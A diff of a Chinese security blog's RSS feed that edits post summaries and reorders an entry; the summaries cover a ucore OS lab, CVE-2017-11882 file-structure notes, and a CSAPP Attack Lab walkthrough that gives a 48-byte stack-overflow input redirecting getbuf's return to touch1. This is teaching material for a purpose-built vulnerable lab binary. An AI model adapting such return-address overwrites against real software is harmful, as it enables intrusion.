@@ -1,5 +1,5 @@
 <?xml version="1.0" encoding="utf-8" standalone="yes"?>
-<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
   <channel>
     <title>Posts on intenのblog🍦</title>
     <link>https://inten.kro1lsec.com/post/</link>
@@ -13,7 +13,8 @@
       <pubDate>Sun, 13 Jun 2021 00:00:00 +0000</pubDate>
       
       <guid>https://inten.kro1lsec.com/post/ucorelab1/</guid>
-      <description>[练习1] 练习 操作系统镜像文件 ucore.img 是如何一步一步生成的?(需要比较详细地解释 Makefile 中每一条相关命令和命令参数的含义,以及说明命令导致的结果)
+      <description>[练习1] 练习指南
+操作系统镜像文件 ucore.img 是如何一步一步生成的?(需要比较详细地解释 Makefile 中每一条相关命令和命令参数的含义,以及说明命令导致的结果)
  设置了项目名称，EMPTY，SPACE，SLASH等，变量V设置是为了进行打印. 设置GCCPRETIX和QEMU，检查是否支持32位的elf文件。 配置 USELLVM include tools/function.mk,包含一个已经已经封装好函数的文件，下文大量调用。 为了生成ucore.img，首先需要生成kernel、bootblock 为了生成kernel，首先需要 kernel.ld init.o readline.o stdio.o kdebug.o kmonitor.o panic.o clock.o console.o intr.o picirq.o trap.o trapentry.o vectors.o pmm.o printfmt.o string.o 为了生成bootblock，首先需要生成bootasm.o、bootmain.o、sign sign的作用是先检测bootblock的大小要小于500，然后在最后增加0x55, 0xaa的标识位， 然后复制到对应目录。 ucore.img使用dd指令将对应的文件合并 最后配置target  all: 对应直接使用make的时候，就是编译出ucore.img，
 lab1-mon使用qemu的monitor模式保存log记录，并运行一个gdb进行调试
 debug-mon: 使用qemu的monitor和gdb配合调试
@@ -34,7 +35,7 @@ file obj/bootblock.o set architecture i8086 target remote :1234 b* 0x7c00 #强�
       <pubDate>Tue, 08 Jun 2021 00:00:00 +0000</pubDate>
       
       <guid>https://inten.kro1lsec.com/post/iot%E7%AE%80%E6%98%93%E6%AF%AB%E7%B1%B3%E6%B3%A2%E9%9B%B7%E8%BE%BE%E5%BC%80%E5%8F%91%E5%B0%8F%E8%AE%B0/</guid>
-      <description>[IOT]简易毫米波雷达开发小记 开发环境 软件
+      <description>开发环境 软件
 Visual Studio 2019
 EasyX_2018春分版
 FlyMcu.exe
@@ -67,6 +68,24 @@ AT&amp;amp;T汇编基本语法 Ucore中用到的是AT&amp;amp;T格式的汇编�
     </item>
     
     <item>
+      <title>[CSAPPLAB]Attack Lab</title>
+      <link>https://inten.kro1lsec.com/post/csapplabattack-lab/</link>
+      <pubDate>Thu, 20 May 2021 15:07:34 +0800</pubDate>
+      
+      <guid>https://inten.kro1lsec.com/post/csapplabattack-lab/</guid>
+      <description>ctarget 首先执行getbuf函数，读取标准输入。
+unsigned getbuf() { char buf[BUFFER_SIZE]; Gets(buf); return 1; } 参数 (ctarget和rtarget都有) -q 不发送成绩 -i 从文件中输入 如果你没有使用-q，就会出现
+FAILED: Initialization error: Running on an illegal host [localhost.localdomain] 因为你没有使用CMU的内网，是无法建立连接的。所以每次进行操作都要带上-q。也可以用qi。
+1.1level 1 观察test，getbuf和touch1
+目的：将getbuf的返回地址由test改为touch1
+小建议
+ 利用objdump -d ./ctarget&amp;gt;&amp;gt;ctarget.s得到汇编代码 思路是将touch1的开始地址，放在某个位置，以实现当ret指令被getbuf执行后会将控制权转移给touch1 一定要注意字节序 你可以使用gdb设置断点来进行调试。并且gcc会影响栈帧中buf存放的位置。需要注意  思路：getbuf函数执行ret指令后，就会从%rsp+40处获取返回地址，只要我们修改这个返回地址，改为touch1的地址，就能使程序返回touch1，而不是test。
+(gdb) p (char*)0x403188 #p(print) 0x403188上存的值 $1 = 0x403188 &amp;#34;No exploit. Getbuf returned 0x%x\n&amp;#34; stack : padding(00..) + touch1(0x4017c0)
+攻击序列touch1.txt
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 c0 17 40 00 00 00 00 00 保存在touch1.</description>
+    </item>
+    
+    <item>
       <title>CVE-2017-11882漏洞分析</title>
       <link>https://inten.kro1lsec.com/post/cve-2017-11882%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</link>
       <pubDate>Tue, 11 May 2021 15:07:34 +0800</pubDate>
@@ -85,24 +104,6 @@ Equation Native Stream Data = EQNOLEFILEHDR + MTEFData，其中
 MTEFData = MTEF header + MTEF Byte Stream
 EQNOLEFILEHDR 头的结构
 struct EQNOLEFILEHDR {WORD cCBHdr; // 格式头长度,大小为0x1CDWORD nVersion; // 固定为0×00020000。WORD nCf; // 该公式对象的剪贴板格式DWORD cbObject; // MTEF数据的长度，不包括头部DWORD nReserved1; // 未使用DWORD nReserved2; // 未使用DWORD nReserved3; // 未使用DWORD nReserved4; // 未使用};MTEF header 的结构，里面存放一些版本信息</description>
-    </item>
-    
-    <item>
-      <title>[CSAPPLAB]Attack Lab</title>
-      <link>https://inten.kro1lsec.com/post/csapplabattack-lab/</link>
-      <pubDate>Tue, 20 Apr 2021 15:07:34 +0800</pubDate>
-      
-      <guid>https://inten.kro1lsec.com/post/csapplabattack-lab/</guid>
-      <description>ctarget 首先执行getbuf函数，读取标准输入。
-unsigned getbuf() { char buf[BUFFER_SIZE]; Gets(buf); return 1; } 参数 (ctarget和rtarget都有) -q 不发送成绩 -i 从文件中输入 如果你没有使用-q，就会出现
-FAILED: Initialization error: Running on an illegal host [localhost.localdomain] 因为你没有使用CMU的内网，是无法建立连接的。所以每次进行操作都要带上-q。也可以用qi。
-1.1level 1 观察test，getbuf和touch1
-目的：将getbuf的返回地址由test改为touch1
-小建议
- 利用objdump -d ./ctarget&amp;gt;&amp;gt;ctarget.s得到汇编代码 思路是将touch1的开始地址，放在某个位置，以实现当ret指令被getbuf执行后会将控制权转移给touch1 一定要注意字节序 你可以使用gdb设置断点来进行调试。并且gcc会影响栈帧中buf存放的位置。需要注意  思路：getbuf函数执行ret指令后，就会从%rsp+40处获取返回地址，只要我们修改这个返回地址，改为touch1的地址，就能使程序返回touch1，而不是test。
-(gdb) p (char*)0x403188 #p(print) 0x403188上存的值 $1 = 0x403188 &amp;#34;No exploit. Getbuf returned 0x%x\n&amp;#34; stack : padding(00..) + touch1(0x4017c0)
-攻击序列touch1.txt
-00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 c0 17 40 00 00 00 00 00 保存在touch1.</description>
     </item>
     
     <item>
